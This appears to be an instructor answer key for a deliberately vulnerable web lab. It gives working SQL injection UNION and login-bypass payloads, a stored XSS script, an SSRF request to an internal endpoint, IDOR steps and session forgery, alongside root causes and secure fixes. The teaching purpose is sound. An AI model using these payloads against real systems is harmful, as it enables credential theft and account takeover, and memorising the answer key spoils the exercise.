# Instructor Solution Guide — NoteVault Web & API Lab

Reference solutions for every task in `README.md`. All outputs below were
captured against the lab containers (`:5000` vulnerable, `:5001` secure).
Share student-facing hints freely; keep exact payloads back until debrief.

## Setup verification

```bash
docker compose up -d --build
curl -s http://localhost:5000/api/health  # {"secure":false,"status":"ok"}
curl -s http://localhost:5001/api/health  # {"secure":true,"status":"ok"}
```

If a port is busy, `docker compose down` then retry. DBs rebuild from seed
on every container start (`init_db` drops and reseeds), so any state a
student corrupts — including injected XSS comments — resets with
`docker compose restart vulnerable`.

## Task 1 — Surface map (expected)

`GET /api/debug` → `200` with full route list on `:5000`, `404` on `:5001`.
Students should enumerate at minimum: `/api/search`, `/api/tickets/<id>`,
`/api/users/<id>`, `/api/avatar/fetch`, `/internal/secret`. Full marks for
also flagging `secret_key_hint` and the verbose-error behavior before any
exploit.

## Task 2 — IDOR (solutions)

Login as alice (`alice` / `alice123`, expect `302`), then:

- `GET /api/tickets/2` → `200`, bob's private ticket (`owner_id: 2`,
  `is_private: 1`). Full chain: ids `1`–`4`; `#3` is admin-only runbook.
- `GET /api/users/2` → `200` incl. `private_note`. Any id works (`1`–`3`).

Root cause (`app.py:api_ticket`, `api_user`): lookup by id, no
`owner_id`/role comparison in vulnerable mode. Secure mode returns
`403 {"error":"forbidden"}` for cross-user reads; admin role may read all
(by design — document this if students ask whether admin access is "still
IDOR": it is not; role-based access is the policy, per-object checks enforce
it).

Common student stuck point: trying unauthenticated (`401`) and concluding
"it's protected." The lesson: auth ≠ authz. Nudge: "log in first, then
change the number."

## Task 3 — SQLi (solutions)

- Probe: `GET /api/search?q='` → `500` with echoed query. Proves
  interpolation. (If a student URL-encodes wrong, `curl --data-urlencode`
  or quotes around the URL fix it.)
- Extraction: `q='%20UNION%20SELECT%20id,username,password%20FROM%20users--%20` (spaces
  URL-encoded; note trailing `%20` after `--`) → all three credential pairs
  in `title`/`body` fields.
- Schema mapping (extension): `q='%20UNION%20SELECT%20name,sql,name%20FROM%20sqlite_master--%20` → table DDL.
- Login bypass: `POST /login` with `username=admin'-- `, any password →
  `302` to `/dashboard` as admin.

Root cause (`app.py:login`, `api_search`, `dashboard`): `%`-formatting of
user input into SQL. Secure mode uses `?` placeholders throughout; probe and
UNION both return `[]`/`401` with no error text.

Grading: full marks for UNION extraction + explanation of why the column
count matters (3 columns) and what `-- ` does. Bonus for `sqlite_master`
or login bypass.

## Task 4 — Stored XSS (solution)

- `POST /api/tickets/4/comments` `{"body":"<script>alert(document.domain)</script>"}`
  → `200 {"id": N}`. Any ticket works; `#4` is shared so the stored payload
  renders for other users.
- Evidence: open `/ticket/4` as alice → `alert(localhost)`; or
  `curl ... | grep '<script>alert'` shows the tag verbatim in HTML.
- Root cause: `ticket.html` renders `{{ c.body|safe }}` in vulnerable mode.
  Secure mode stores identical bytes but renders escaped
  (`&lt;script&gt;`) + sends `Content-Security-Policy: default-src 'self'`.

Debrief point: ask "who does the script run as?" — the *reader*. Have them
articulate the admin-cookie-theft scenario. Full marks for noting
output-encoding (not input-blocking) is the fix, and why naive blocklists
(`strip <script>`) fail (case, events like `onerror`, etc.).

Reset note: posted payloads persist until container restart. That's fine —
but if a student's own alert annoys them, `docker compose restart
vulnerable` reseeds clean.

## Task 5 — SSRF (solution)

- `POST /api/avatar/fetch` `{"url":"http://127.0.0.1:5000/internal/secret"}`
  → `200` with `preview` containing `flag{ssrf-reached-internal-admin}`.
- Root cause (`app.py:avatar_fetch`): `requests.get(url)` with redirects on,
  no scheme/host/IP validation. The server's network position does the rest.
- Secure mode: `_is_public_url` resolves the host, rejects private/loopback/
  link-local/reserved, allows http(s) only, `allow_redirects=False` →
  `400 {"error":"blocked: ..."}`.
- Extension credit: blind network mapping via error differences, or
  explaining why `file://` fails here (client library protocols) and what
  fetcher *would* make it critical (one speaking `file`/`gopher`).

SSRF flag: `flag{ssrf-reached-internal-admin}` (constant in `app.py`).

## Task 6 — Bonus (expected answers)

- Session forgery: `secret_key = "dev-secret-change-me"` hardcoded; secure
  build refuses to start without `SECRET_KEY` env. A student demonstrating
  forged-cookie login with `itsdangerous` earns top marks but it is not
  required.
- Enumeration: `Unknown user` vs `Wrong password` (vuln) → single `Invalid
  credentials` (secure).

## Task 7 — Verification (expected)

Replay matrix (secure `:5001`): IDOR → `403`; UNION → `[]`; login bypass →
`401`; XSS render → escaped, no alert; SSRF → `400 blocked`; debug →
`404`. Functionality intact: `wifi` search hits `#4`, plaintext comment
posts, public-URL avatar fetch works. `bash tests/verify.sh` automates all
of it and exits non-zero on any failure — run it before class.

## Troubleshooting

| symptom | cause / fix |
|---|---|
| `connection refused` on `:5000` | container still starting; `docker compose ps`, retry in 5s |
| login returns `401` with right password | talking to `:5001` with `:5000` creds flow — same seeds, but check port; or DB was reseeded mid-session, re-login |
| UNION returns `[]` on `:5000` | missing trailing space after `--`, or column count wrong; use exact payload above |
| no alert on `/ticket/4` | not logged in via browser, or viewing wrong ticket id; comment posts return the ticket echo — confirm `id` |
| SSRF `fetch failed` | URL typo; container-internal `127.0.0.1:5000` is correct because the fetcher runs *inside* the container network namespace (both services share the default network, and `vulnerable` listens on 5000) |
| secure container exits immediately | `SECRET_KEY` unset — `docker compose up` sets it; don't run the image bare with `SECURE=1` |
